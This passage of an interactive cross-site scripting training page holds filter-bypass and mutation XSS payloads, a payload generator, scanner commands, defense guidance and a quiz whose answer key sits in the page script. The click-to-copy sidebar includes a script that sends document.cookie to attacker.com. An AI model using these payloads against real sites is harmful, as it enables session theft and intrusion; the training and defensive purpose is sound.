&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;

// Template literals
&lt;script&gt;alert`1`&lt;/script&gt;

// Using constructor
&lt;script&gt;[].constructor.constructor('alert(1)')()&lt;/script&gt;</code></pre>

                        <h3>Filter-Specific Bypasses</h3>
                        <h4>Bypassing "script" Blacklist</h4>
                        <pre><code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
&lt;sc&#x72;ipt&gt;alert(1)&lt;/script&gt;</code></pre>

                        <h4>Bypassing Parentheses Filter</h4>
                        <pre><code>onerror=alert;throw 1
onerror=alert`1`
&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;</code></pre>

                        <h4>Bypassing Quotes Filter</h4>
                        <pre><code>String.fromCharCode(88,83,83)
/XSS/.source
`XSS`</code></pre>

                        <div class="callout info">
                            <strong>Testing Tip:</strong> Always test with multiple bypass techniques. A single filter evasion might not work, but combining techniques often succeeds.
                        </div>

                        <h3>Mutation XSS (mXSS)</h3>
                        <p>Exploiting browser parsing differences:</p>
                        <pre><code>&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;
&lt;listing&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/listing&gt;
&lt;style&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/style&gt;</code></pre>

                        <div class="payload-builder">
                            <h3 style="margin-top: 0;">Interactive Payload Builder</h3>
                            <p style="color: #a0a0a0; margin-bottom: 15px;">Build custom XSS payloads based on context and filters.</p>

                            <h4>Select Context:</h4>
                            <div class="builder-grid">
                                <div class="builder-option" data-type="context" data-value="html" onclick="selectBuilder(this)">
                                    <strong>HTML Body</strong>
                                    <p style="font-size: 0.85em; margin-top: 5px;">Direct HTML injection</p>
                                </div>
                                <div class="builder-option" data-type="context" data-value="attribute" onclick="selectBuilder(this)">
                                    <strong>HTML Attribute</strong>
                                    <p style="font-size: 0.85em; margin-top: 5px;">Inside tag attribute</p>
                                </div>
                                <div class="builder-option" data-type="context" data-value="javascript" onclick="selectBuilder(this)">
                                    <strong>JavaScript</strong>
                                    <p style="font-size: 0.85em; margin-top: 5px;">Inside &lt;script&gt; block</p>
                                </div>
                                <div class="builder-option" data-type="context" data-value="url" onclick="selectBuilder(this)">
                                    <strong>URL</strong>
                                    <p style="font-size: 0.85em; margin-top: 5px;">In href or src</p>
                                </div>
                            </div>

                            <h4>Bypass Techniques:</h4>
                            <div class="builder-grid">
                                <div class="builder-option" data-type="bypass" data-value="case" onclick="selectBuilder(this)">
                                    <strong>Case Variation</strong>
                                </div>
                                <div class="builder-option" data-type="bypass" data-value="encoding" onclick="selectBuilder(this)">
                                    <strong>HTML Encoding</strong>
                                </div>
                                <div class="builder-option" data-type="bypass" data-value="svg" onclick="selectBuilder(this)">
                                    <strong>SVG Tags</strong>
                                </div>
                                <div class="builder-option" data-type="bypass" data-value="events" onclick="selectBuilder(this)">
                                    <strong>Alt Events</strong>
                                </div>
                            </div>

                            <button class="btn" onclick="generatePayload()">Generate Payload</button>
                            <button class="btn btn-danger" onclick="resetBuilder()">Reset</button>

                            <div id="generatedPayload" style="display: none;" class="generated-payload">
                                <strong>Generated Payload:</strong>
                                <pre style="margin-top: 10px; background: transparent; border: none; padding: 0;"><code id="payloadCode"></code></pre>
                                <button class="btn" onclick="copyPayload()" style="margin-top: 10px;">Copy to Clipboard</button>
                            </div>
                        </div>
                    </div>

                    <!-- TOOLS SECTION -->
                    <div class="section" id="tools">
                        <h2>XSS Testing Tools</h2>

                        <div class="tool-card">
                            <h4>Browser Developer Tools</h4>
                            <p><strong>Primary Tool:</strong> Chrome/Firefox DevTools (F12)</p>
                            <ul>
                                <li><strong>Elements Tab:</strong> Inspect how input is rendered in DOM</li>
                                <li><strong>Console:</strong> Test JavaScript execution context</li>
                                <li><strong>Network Tab:</strong> Monitor outbound requests from XSS</li>
                                <li><strong>Sources:</strong> Set breakpoints on dangerous sinks (innerHTML, eval)</li>
                            </ul>
                            <pre><code>// Console commands for testing
document.querySelectorAll('*').forEach(e =&gt; console.log(e.innerHTML));
// Find all innerHTML assignments

Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set
// Check innerHTML setter</code></pre>
                        </div>

                        <div class="tool-card">
                            <h4>XSS Hunter</h4>
                            <p><strong>Purpose:</strong> Blind XSS detection - captures proof when payload executes</p>
                            <ul>
                                <li>Generates unique payloads with callback URLs</li>
                                <li>Captures screenshots, cookies, DOM when triggered</li>
                                <li>Ideal for testing delayed execution (admin panels, logs)</li>
                                <li>Free tier available at xsshunter.com</li>
                            </ul>
                            <pre><code>&lt;script src="https://yoursubdomain.xss.ht"&gt;&lt;/script&gt;</code></pre>
                        </div>

                        <div class="tool-card">
                            <h4>Burp Suite Intruder</h4>
                            <p><strong>Use Case:</strong> Automated fuzzing with payload lists</p>
                            <ul>
                                <li>Load XSS payload wordlists (SecLists, PayloadsAllTheThings)</li>
                                <li>Configure attack positions (parameters to test)</li>
                                <li>Grep for execution indicators: <code>&lt;script&gt;</code>, <code>onerror</code>, etc.</li>
                                <li>Community Edition: Free, Professional: $399/year</li>
                            </ul>
                            <p><strong>Workflow:</strong></p>
                            <ol>
                                <li>Capture request in Proxy</li>
                                <li>Send to Intruder (Ctrl+I)</li>
                                <li>Mark injection points with §§</li>
                                <li>Load payload list (Payloads tab)</li>
                                <li>Add grep match for alert, onerror, etc.</li>
                                <li>Start attack and review matches</li>
                            </ol>
                        </div>

                        <div class="tool-card">
                            <h4>OWASP ZAP (Zed Attack Proxy)</h4>
                            <p><strong>Free Alternative:</strong> Open-source security scanner</p>
                            <ul>
                                <li>Active scanner with XSS rules</li>
                                <li>Fuzzer for payload injection</li>
                                <li>Automatic DOM XSS detection</li>
                                <li>Completely free and open source</li>
                            </ul>
                        </div>

                        <div class="tool-card">
                            <h4>XSStrike</h4>
                            <p><strong>Python Tool:</strong> Advanced XSS detection suite</p>
                            <pre><code># Install
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt

# Usage
python xsstrike.py -u "http://target.com/page?param=value"
python xsstrike.py -u "http://target.com/search" --data "q=test"</code></pre>
                            <ul>
                                <li>Intelligent payload generation</li>
                                <li>Context analysis</li>
                                <li>WAF detection and bypass</li>
                                <li>Crawling capabilities</li>
                            </ul>
                        </div>

                        <div class="tool-card">
                            <h4>Nuclei</h4>
                            <p><strong>Template-Based Scanner:</strong> Fast XSS template scanning</p>
                            <pre><code># Install
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Run XSS templates
nuclei -u https://target.com -t xss/
nuclei -l urls.txt -t xss/ -o results.txt</code></pre>
                        </div>

                        <div class="tool-card">
                            <h4>Dalfox</h4>
                            <p><strong>Fast XSS Scanner:</strong> Parameter analysis and automation</p>
                            <pre><code># Install
go install github.com/hahwul/dalfox/v2@latest

# Usage
dalfox url http://target.com/page?param=FUZZ
dalfox file urls.txt -o results.txt</code></pre>
                        </div>

                        <div class="tool-card">
                            <h4>DOM Invader (Burp Extension)</h4>
                            <p><strong>Browser Extension:</strong> Real-time DOM XSS detection</p>
                            <ul>
                                <li>Tracks sources and sinks automatically</li>
                                <li>Highlights dangerous flows in real-time</li>
                                <li>Built into Burp Suite Professional</li>
                                <li>Browser-based testing companion</li>
                            </ul>
                        </div>

                        <h3>Payload Resources</h3>
                        <div class="callout info">
                            <strong>Essential Wordlists:</strong>
                            <ul>
                                <li><strong>PayloadsAllTheThings:</strong> github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection</li>
                                <li><strong>SecLists:</strong> github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS</li>
                                <li><strong>PortSwigger XSS Cheat Sheet:</strong> portswigger.net/web-security/cross-site-scripting/cheat-sheet</li>
                                <li><strong>OWASP:</strong> owasp.org/www-community/xss-filter-evasion-cheatsheet</li>
                            </ul>
                        </div>

                        <h3>Testing Methodology</h3>
                        <ol>
                            <li><strong>Reconnaissance:</strong> Map all input points (forms, URLs, headers)</li>
                            <li><strong>Context Analysis:</strong> Determine injection context (HTML, attribute, JS, URL)</li>
                            <li><strong>Manual Testing:</strong> Test basic payloads to understand behavior</li>
                            <li><strong>Automated Scanning:</strong> Use tools to test payload variations</li>
                            <li><strong>Bypass Attempts:</strong> If filtered, try encoding and obfuscation</li>
                            <li><strong>Documentation:</strong> Record working payloads with screenshots</li>
                            <li><strong>Impact Analysis:</strong> Demonstrate real-world attack scenarios</li>
                        </ol>
                    </div>

                    <!-- DEFENSE SECTION -->
                    <div class="section" id="defense">
                        <h2>XSS Defense Mechanisms</h2>

                        <div class="callout success">
                            <strong>Defense in Depth:</strong> No single technique prevents all XSS. Use multiple layers of protection.
                        </div>

                        <h3>1. Output Encoding (Primary Defense)</h3>
                        <p>Encode data based on context before inserting into page:</p>

                        <h4>HTML Entity Encoding</h4>
                        <pre><code>// JavaScript
function encodeHTML(str) {
    return str.replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;')
              .replace(/"/g, '&quot;')
              .replace(/'/g, '&#x27;');
}

// Output: &lt;script&gt;alert(1)&lt;/script&gt;
console.log(encodeHTML("&lt;script&gt;alert(1)&lt;/script&gt;"));</code></pre>

                        <h4>JavaScript String Encoding</h4>
                        <pre><code>// When inserting into JavaScript context
function encodeJS(str) {
    return str.replace(/\\/g, '\\\\')
              .replace(/'/g, "\\'")
              .replace(/"/g, '\\"')
              .replace(/\n/g, '\\n')
              .replace(/\r/g, '\\r');
}

&lt;script&gt;
    var name = '&lt;%= encodeJS(userInput) %&gt;';
&lt;/script&gt;</code></pre>

                        <h4>URL Encoding</h4>
                        <pre><code>// JavaScript
encodeURIComponent(userInput)

// Python
from urllib.parse import quote
safe_url = quote(user_input)

// PHP
urlencode($user_input)</code></pre>

                        <h3>2. Content Security Policy (CSP)</h3>
                        <p>HTTP header that restricts script sources and inline execution:</p>

                        <h4>Basic CSP</h4>
                        <pre><code>// HTTP Header
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

// Meta tag (less secure, can't block inline scripts)
&lt;meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'"&gt;</code></pre>

                        <h4>Strong CSP Configuration</h4>
                        <pre><code>Content-Security-Policy:
    default-src 'none';
    script-src 'self' https://cdn.trusted.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.trusted.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';</code></pre>

                        <h4>CSP with Nonces (Best Practice)</h4>
                        <pre><code>// Server generates random nonce per request
Content-Security-Policy: script-src 'nonce-r4nd0m123'

// Only scripts with matching nonce execute
&lt;script nonce="r4nd0m123"&gt;
    // This executes
&lt;/script&gt;

&lt;script&gt;
    // This is blocked
&lt;/script&gt;</code></pre>

                        <div class="callout info">
                            <strong>CSP Benefits:</strong> Even if XSS payload is injected, CSP prevents execution by blocking inline scripts and untrusted sources. Acts as a strong second layer of defense.
                        </div>

                        <h3>3. HTTPOnly Cookies</h3>
                        <p>Prevent JavaScript access to session cookies:</p>
                        <pre><code>// Server sets cookie with HTTPOnly flag
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict

// JavaScript cannot access this cookie
console.log(document.cookie); // sessionid won't appear</code></pre>

                        <h3>4. Input Validation</h3>
                        <p>Validate input format (not as XSS prevention, but general security):</p>
                        <pre><code>// Whitelist allowed characters
function validateInput(input, type) {
    const patterns = {
        email: /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/,
        alphanumeric: /^[a-zA-Z0-9]+$/,
        numeric: /^[0-9]+$/
    };
    return patterns[type].test(input);
}</code></pre>

                        <div class="callout warning">
                            <strong>Important:</strong> Input validation alone is NOT sufficient for XSS prevention. Always use output encoding.
                        </div>

                        <h3>5. Sanitization Libraries</h3>
                        <p>Use battle-tested libraries for complex scenarios:</p>

                        <h4>DOMPurify (JavaScript)</h4>
                        <pre><code>// Client-side HTML sanitization
import DOMPurify from 'dompurify';

const dirty = '&lt;img src=x onerror=alert(1)&gt;';
const clean = DOMPurify.sanitize(dirty);
// Result: &lt;img src="x"&gt; (onerror removed)

element.innerHTML = clean; // Safe</code></pre>

                        <h4>OWASP Java Encoder</h4>
                        <pre><code>import org.owasp.encoder.Encode;

String safe = Encode.forHtml(userInput);
out.println("&lt;div&gt;" + safe + "&lt;/div&gt;");</code></pre>

                        <h4>Python bleach</h4>
                        <pre><code>import bleach

clean = bleach.clean(user_input,
    tags=['p', 'b', 'i', 'u', 'em', 'strong'],
    attributes={},
    strip=True
)</code></pre>

                        <h3>6. Framework-Specific Protections</h3>

                        <h4>React</h4>
                        <pre><code>// React automatically escapes JSX expressions
const element = &lt;div&gt;{userInput}&lt;/div&gt;; // SAFE

// Dangerous: only use with sanitized data
const dangerous = &lt;div dangerouslySetInnerHTML={{__html: userInput}} /&gt;;</code></pre>

                        <h4>Angular</h4>
                        <pre><code>&lt;!-- Angular sanitizes by default --&gt;
&lt;div&gt;{{ userInput }}&lt;/div&gt; &lt;!-- SAFE --&gt;

&lt;!-- Dangerous: bypasses sanitization --&gt;
&lt;div [innerHTML]="userInput"&gt;&lt;/div&gt;</code></pre>

                        <h4>Vue.js</h4>
                        <pre><code>&lt;!-- Vue escapes by default --&gt;
&lt;div&gt;{{ userInput }}&lt;/div&gt; &lt;!-- SAFE --&gt;

&lt;!-- Dangerous: renders raw HTML --&gt;
&lt;div v-html="userInput"&gt;&lt;/div&gt;</code></pre>

                        <h3>7. Template Engines with Auto-Escaping</h3>
                        <pre><code>// Jinja2 (Python) - auto-escapes by default
{{ user_input }}  {# SAFE #}
{{ user_input | safe }}  {# DANGEROUS #}

// Handlebars (JavaScript)
{{ userInput }}  {{! SAFE }}
{{{ userInput }}}  {{! DANGEROUS - triple braces disable escaping }}</code></pre>

                        <h3>8. Security Headers</h3>
                        <pre><code>// Prevent MIME sniffing
X-Content-Type-Options: nosniff

// Enable XSS filter in older browsers (deprecated but doesn't hurt)
X-XSS-Protection: 1; mode=block

// Prevent clickjacking (related to XSS attacks)
X-Frame-Options: DENY

// Control referrer information
Referrer-Policy: strict-origin-when-cross-origin</code></pre>

                        <h3>Secure Coding Practices</h3>
                        <div class="tool-card">
                            <h4>DO:</h4>
                            <ul>
                                <li>Use textContent instead of innerHTML when inserting plain text</li>
                                <li>Encode output based on context (HTML, JS, URL, CSS)</li>
                                <li>Implement strong CSP with nonces</li>
                                <li>Use HTTPOnly and Secure flags on cookies</li>
                                <li>Validate input format (as defense-in-depth, not primary defense)</li>
                                <li>Use established sanitization libraries</li>
                                <li>Regularly update dependencies</li>
                            </ul>
                        </div>

                        <div class="tool-card">
                            <h4>DON'T:</h4>
                            <ul>
                                <li>Trust user input - ever</li>
                                <li>Use blacklist filters (easily bypassed)</li>
                                <li>Rely on client-side validation alone</li>
                                <li>Use eval(), Function(), or innerHTML with user data</li>
                                <li>Disable framework auto-escaping</li>
                                <li>Store sensitive data in client-side JavaScript variables</li>
                                <li>Use 'unsafe-inline' in CSP without nonces</li>
                            </ul>
                        </div>

                        <h3>Testing Your Defenses</h3>
                        <ol>
                            <li>Review CSP headers with browser DevTools</li>
                            <li>Use CSP Evaluator: csp-evaluator.withgoogle.com</li>
                            <li>Test with OWASP ZAP or Burp Suite</li>
                            <li>Manual code review for dangerous sinks</li>
                            <li>Penetration testing with payload variations</li>
                            <li>Check Security Headers: securityheaders.com</li>
                        </ol>

                        <div class="callout success">
                            <strong>Golden Rule:</strong> Treat all user input as hostile. Encode on output, validate on input, implement CSP, and use HTTPOnly cookies. Defense in depth is key.
                        </div>
                    </div>

                    <!-- QUIZ SECTION -->
                    <div class="section" id="quiz">
                        <h2>XSS Mastery Quiz</h2>

                        <div class="callout info">
                            <strong>Test Your Knowledge:</strong> Answer these 8 questions to demonstrate your understanding of XSS attacks and defenses. You need 6/8 (75%) to pass.
                        </div>

                        <div class="quiz-container">
                            <div class="quiz-question" data-question="1">
                                <h4>1. What is the primary difference between Reflected XSS and Stored XSS?</h4>
                                <div class="quiz-option" data-answer="a" onclick="selectAnswer(1, 'a')">
                                    A) Reflected XSS is more dangerous
                                </div>
                                <div class="quiz-option" data-answer="b" onclick="selectAnswer(1, 'b')">
                                    B) Stored XSS persists in database and affects all users
                                </div>
                                <div class="quiz-option" data-answer="c" onclick="selectAnswer(1, 'c')">
                                    C) Reflected XSS requires authentication
                                </div>
                                <div class="quiz-option" data-answer="d" onclick="selectAnswer(1, 'd')">
                                    D) They are the same vulnerability
                                </div>
                            </div>

                            <div class="quiz-question" data-question="2">
                                <h4>2. In DOM-based XSS, where does the vulnerability exist?</h4>
                                <div class="quiz-option" data-answer="a" onclick="selectAnswer(2, 'a')">
                                    A) Server-side code
                                </div>
                                <div class="quiz-option" data-answer="b" onclick="selectAnswer(2, 'b')">
                                    B) Database queries
                                </div>
                                <div class="quiz-option" data-answer="c" onclick="selectAnswer(2, 'c')">
                                    C) Client-side JavaScript
                                </div>
                                <div class="quiz-option" data-answer="d" onclick="selectAnswer(2, 'd')">
                                    D) HTTP headers
                                </div>
                            </div>

                            <div class="quiz-question" data-question="3">
                                <h4>3. Which method is the PRIMARY defense against XSS?</h4>
                                <div class="quiz-option" data-answer="a" onclick="selectAnswer(3, 'a')">
                                    A) Input validation
                                </div>
                                <div class="quiz-option" data-answer="b" onclick="selectAnswer(3, 'b')">
                                    B) Output encoding/escaping
                                </div>
                                <div class="quiz-option" data-answer="c" onclick="selectAnswer(3, 'c')">
                                    C) Web Application Firewall
                                </div>
                                <div class="quiz-option" data-answer="d" onclick="selectAnswer(3, 'd')">
                                    D) Using HTTPS
                                </div>
                            </div>

                            <div class="quiz-question" data-question="4">
                                <h4>4. What does the HTTPOnly flag on cookies prevent?</h4>
                                <div class="quiz-option" data-answer="a" onclick="selectAnswer(4, 'a')">
                                    A) Prevents cookies from being sent over HTTP
                                </div>
                                <div class="quiz-option" data-answer="b" onclick="selectAnswer(4, 'b')">
                                    B) Prevents JavaScript access to the cookie
                                </div>
                                <div class="quiz-option" data-answer="c" onclick="selectAnswer(4, 'c')">
                                    C) Prevents cookie theft over network
                                </div>
                                <div class="quiz-option" data-answer="d" onclick="selectAnswer(4, 'd')">
                                    D) Prevents cookie modification
                                </div>
                            </div>

                            <div class="quiz-question" data-question="5">
                                <h4>5. Which of these is a dangerous JavaScript sink for DOM XSS?</h4>
                                <div class="quiz-option" data-answer="a" onclick="selectAnswer(5, 'a')">
                                    A) textContent
                                </div>
                                <div class="quiz-option" data-answer="b" onclick="selectAnswer(5, 'b')">
                                    B) innerHTML
                                </div>
                                <div class="quiz-option" data-answer="c" onclick="selectAnswer(5, 'c')">
                                    C) getAttribute
                                </div>
                                <div class="quiz-option" data-answer="d" onclick="selectAnswer(5, 'd')">
                                    D) getElementById
                                </div>
                            </div>

                            <div class="quiz-question" data-question="6">
                                <h4>6. What is the purpose of Content Security Policy (CSP)?</h4>
                                <div class="quiz-option" data-answer="a" onclick="selectAnswer(6, 'a')">
                                    A) Encrypts sensitive data
                                </div>
                                <div class="quiz-option" data-answer="b" onclick="selectAnswer(6, 'b')">
                                    B) Restricts sources from which scripts can load and execute
                                </div>
                                <div class="quiz-option" data-answer="c" onclick="selectAnswer(6, 'c')">
                                    C) Validates user input
                                </div>
                                <div class="quiz-option" data-answer="d" onclick="selectAnswer(6, 'd')">
                                    D) Prevents SQL injection
                                </div>
                            </div>

                            <div class="quiz-question" data-question="7">
                                <h4>7. Which payload type would bypass a simple filter blocking the word "script"?</h4>
                                <div class="quiz-option" data-answer="a" onclick="selectAnswer(7, 'a')">
                                    A) &lt;script&gt;alert(1)&lt;/script&gt;
                                </div>
                                <div class="quiz-option" data-answer="b" onclick="selectAnswer(7, 'b')">
                                    B) &lt;img src=x onerror=alert(1)&gt;
                                </div>
                                <div class="quiz-option" data-answer="c" onclick="selectAnswer(7, 'c')">
                                    C) alert(1)
                                </div>
                                <div class="quiz-option" data-answer="d" onclick="selectAnswer(7, 'd')">
                                    D) None of the above
                                </div>
                            </div>

                            <div class="quiz-question" data-question="8">
                                <h4>8. What is a polyglot XSS payload?</h4>
                                <div class="quiz-option" data-answer="a" onclick="selectAnswer(8, 'a')">
                                    A) A payload that works in multiple programming languages
                                </div>
                                <div class="quiz-option" data-answer="b" onclick="selectAnswer(8, 'b')">
                                    B) A payload that works in multiple injection contexts
                                </div>
                                <div class="quiz-option" data-answer="c" onclick="selectAnswer(8, 'c')">
                                    C) A payload encrypted with multiple algorithms
                                </div>
                                <div class="quiz-option" data-answer="d" onclick="selectAnswer(8, 'd')">
                                    D) A payload targeting multiple browsers
                                </div>
                            </div>

                            <button class="btn" onclick="submitQuiz()">Submit Quiz</button>
                            <button class="btn btn-danger" onclick="resetQuiz()">Reset Quiz</button>

                            <div id="quizResults" style="display: none;"></div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- SIDEBAR -->
            <div class="sidebar">
                <h3>Quick Payloads</h3>
                <p style="color: #a0a0a0; font-size: 0.85em; margin-bottom: 15px;">Click to copy to clipboard</p>

                <div class="payload-item" onclick="copyText(this.querySelector('.payload-code').textContent)">
                    <div class="payload-code">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
                    <div class="payload-desc">Basic script injection</div>
                </div>

                <div class="payload-item" onclick="copyText(this.querySelector('.payload-code').textContent)">
                    <div class="payload-code">&lt;img src=x onerror=alert('XSS')&gt;</div>
                    <div class="payload-desc">Image error handler</div>
                </div>

                <div class="payload-item" onclick="copyText(this.querySelector('.payload-code').textContent)">
                    <div class="payload-code">&lt;svg onload=alert('XSS')&gt;</div>
                    <div class="payload-desc">SVG onload event</div>
                </div>

                <div class="payload-item" onclick="copyText(this.querySelector('.payload-code').textContent)">
                    <div class="payload-code">" onmouseover="alert('XSS')</div>
                    <div class="payload-desc">Attribute breakout</div>
                </div>

                <div class="payload-item" onclick="copyText(this.querySelector('.payload-code').textContent)">
                    <div class="payload-code">javascript:alert('XSS')</div>
                    <div class="payload-desc">JavaScript protocol</div>
                </div>

                <div class="payload-item" onclick="copyText(this.querySelector('.payload-code').textContent)">
                    <div class="payload-code">&lt;body onload=alert('XSS')&gt;</div>
                    <div class="payload-desc">Body onload event</div>
                </div>

                <div class="payload-item" onclick="copyText(this.querySelector('.payload-code').textContent)">
                    <div class="payload-code">&lt;input onfocus=alert('XSS') autofocus&gt;</div>
                    <div class="payload-desc">Autofocus trigger</div>
                </div>

                <div class="payload-item" onclick="copyText(this.querySelector('.payload-code').textContent)">
                    <div class="payload-code">&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</div>
                    <div class="payload-desc">Case variation bypass</div>
                </div>

                <div class="payload-item" onclick="copyText(this.querySelector('.payload-code').textContent)">
                    <div class="payload-code">&lt;script&gt;fetch('//attacker.com?c='+document.cookie)&lt;/script&gt;</div>
                    <div class="payload-desc">Cookie exfiltration</div>
                </div>

                <div class="payload-item" onclick="copyText(this.querySelector('.payload-code').textContent)">
                    <div class="payload-code">&lt;svg&gt;&lt;animate onbegin=alert('XSS')&gt;</div>
                    <div class="payload-desc">SVG animation event</div>
                </div>

                <h3 style="margin-top: 30px;">Context-Specific</h3>

                <div class="payload-item" onclick="copyText(this.querySelector('.payload-code').textContent)">
                    <div class="payload-code">'-alert(1)-'</div>
                    <div class="payload-desc">JavaScript string context</div>
                </div>

                <div class="payload-item" onclick="copyText(this.querySelector('.payload-code').textContent)">
                    <div class="payload-code">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div>
                    <div class="payload-desc">Script tag breakout</div>
                </div>

                <div class="payload-item" onclick="copyText(this.querySelector('.payload-code').textContent)">
                    <div class="payload-code">&lt;iframe src=javascript:alert(1)&gt;</div>
                    <div class="payload-desc">Iframe JavaScript URL</div>
                </div>

                <h3 style="margin-top: 30px;">Progress</h3>
                <div style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; margin-top: 10px;">
                    <p style="color: #a0a0a0; font-size: 0.85em; margin-bottom: 10px;">Sections Viewed: <span id="sidebarProgress">0/9</span></p>
                    <p style="color: #a0a0a0; font-size: 0.85em;">Quiz Status: <span id="sidebarQuiz">Not Started</span></p>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ================================
        // STATE MANAGEMENT
        // ================================
        const quizAnswers = {
            1: 'b',
            2: 'c',
            3: 'b',
            4: 'b',
            5: 'b',
            6: 'b',
            7: 'b',
            8: 'b'
        };

        const userAnswers = {};
        const viewedSections = new Set(['overview']);
        let builderState = {
            context: null,
            bypass: null
        };

        // ================================
        // TAB NAVIGATION
        // ================================
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', () => {
                const targetTab = tab.dataset.tab;

                // Update tabs
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                tab.classList.add('active');

                // Update sections
                document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
                document.getElementById(targetTab).classList.add('active');

                // Track viewed sections
                viewedSections.add(targetTab);
                updateProgress();
            });
        });

        // ================================
        // SANDBOX FUNCTIONALITY
        // ================================
        function testXSS() {
            const input = document.getElementById('sandboxInput').value;
            const output = document.getElementById('sandboxOutput');
            const simulated = document.getElementById('simulatedOutput');

            // Show what the payload looks like
            output.innerHTML = `<strong>Your Payload:</strong><br><code style="color: #fbbf24;">${escapeHtml(input)}</code><br><br>`;
            output.innerHTML += `<strong>Analysis:</strong><br>`;

            if (input.toLowerCase().includes('<script>')) {
                output.innerHTML += `Detected &lt;script&gt; tag - This would execute JavaScript if unfiltered.<br>`;
            }
            if (input.toLowerCase().includes('onerror')) {
                output.innerHTML += `Detected event handler (onerror) - This would trigger on error.<br>`;
            }
            if (input.toLowerCase().includes('onload')) {
                output.innerHTML += `Detected event handler (onload) - This would trigger on load.<br>`;
            }
            if (input.toLowerCase().includes('javascript:')) {
                output.innerHTML += `Detected javascript: protocol - This would execute in href/src context.<br>`;
            }

            output.innerHTML += `<br><strong>Security Note:</strong> This payload has been sanitized for display. On a vulnerable site, it would execute.`;

            // Show sanitized version (safe)
            simulated.innerHTML = `<p style="color: #666;">Sanitized Output (Safe):</p><p>${escapeHtml(input)}</p>`;
        }

        function clearSandbox() {
            document.getElementById('sandboxInput').value = '';
            document.getElementById('sandboxOutput').innerHTML = '<em>Output will appear here...</em>';
            document.getElementById('simulatedOutput').innerHTML = '';
        }

        function simulateReflected() {
            const input = document.getElementById('reflectedInput').value;
            const output = document.getElementById('reflectedDemo');

            output.innerHTML = `<strong>Simulated Server Response:</strong><br><br>`;
            output.innerHTML += `<code>HTTP/1.1 200 OK</code><br>`;
            output.innerHTML += `<code>Content-Type: text/html</code><br><br>`;
            output.innerHTML += `<code>&lt;div&gt;You searched for: ${escapeHtml(input)}&lt;/div&gt;</code><br><br>`;
            output.innerHTML += `<strong>If vulnerable (no encoding):</strong><br>`;
            output.innerHTML += `<code>&lt;div&gt;You searched for: ${input}&lt;/div&gt;</code><br><br>`;
            output.innerHTML += `<em>Notice: Without encoding, special characters would be interpreted as HTML/JavaScript.</em>`;
        }

        function simulateDOM() {
            const input = document.getElementById('domInput').value;
            const output = document.getElementById('domDemo');

            output.innerHTML = `<strong>Vulnerable Code Pattern:</strong><br>`;
            output.innerHTML += `<code style="color: #fbbf24;">var name = window.location.hash.substring(1);<br>`;
            output.innerHTML += `document.getElementById('output').innerHTML = name;</code><br><br>`;
            output.innerHTML += `<strong>If URL was:</strong> <code>https://site.com#${escapeHtml(input)}</code><br><br>`;
            output.innerHTML += `<strong>The DOM would contain:</strong><br>`;
            output.innerHTML += `<code>&lt;div id="output"&gt;${escapeHtml(input)}&lt;/div&gt;</code><br><br>`;
            output.innerHTML += `<em>If this contains malicious HTML/JS and innerHTML is used, it executes.</em>`;
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // ================================
        // PAYLOAD BUILDER
        // ================================
        function selectBuilder(element) {
            const type = element.dataset.type;
            const value = element.dataset.value;

            // Deselect others in same category
            document.querySelectorAll(`.builder-option[data-type="${type}"]`).forEach(opt => {
                opt.classList.remove('selected');
            });

            element.classList.add('selected');
            builderState[type] = value;
        }

        function generatePayload() {
            const { context, bypass } = builderState;

            if (!context) {
                alert('Please select a context first.');
                return;
            }

            let payload = '';

            // Base payloads by context
            const basePayloads = {
                html: '<script>alert(\'XSS\')</script>',
                attribute: '" onmouseover="alert(\'XSS\')',
                javascript: '\'; alert(\'XSS\'); //',
                url: 'javascript:alert(\'XSS\')'
            };

            payload = basePayloads[context];

            // Apply bypass if selected
            if (bypass === 'case') {
                payload = payload.replace(/script/gi, 'ScRiPt');
            } else if (bypass === 'encoding') {
                if (context === 'html') {
                    payload = '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">';
                }
            } else if (bypass === 'svg') {
                payload = '<svg onload=alert(\'XSS\')>';
            } else if (bypass === 'events') {
                payload = '<input onfocus=alert(\'XSS\') autofocus>';
            }

            // Display result
            document.getElementById('payloadCode').textContent = payload;
            document.getElementById('generatedPayload').style.display = 'block';
        }

        function resetBuilder() {
            builderState = { context: null, bypass: null };
            document.querySelectorAll('.builder-option').forEach(opt => opt.classList.remove('selected'));
            document.getElementById('generatedPayload').style.display = 'none';
        }

        function copyPayload() {
            const text = document.getElementById('payloadCode').textContent;
            copyText(text);
        }

        // ================================
        // QUIZ FUNCTIONALITY
        // ================================
        function selectAnswer(question, answer) {
            userAnswers[question] = answer;

            // Update UI
            const questionDiv = document.querySelector(`[data-question="${question}"]`);
